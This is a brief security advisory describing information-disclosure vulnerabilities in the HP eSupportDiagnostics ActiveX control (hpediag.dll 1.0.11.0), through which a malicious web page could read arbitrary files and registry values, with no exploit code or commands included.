The HP eSupportDiagnostics ActiveX control is prone to multiple information-disclosure vulnerabilities.

An attacker can exploit these issues by enticing an unsuspecting victim to visit a malicious HTML page.

Successfully exploiting these issues allows remote attackers to obtain the contents of arbitrary files and registry values. Information harvested may aid in further attacks.

These issues affect 'hpediag.dll' 1.0.11.0; other versions may also be affected.
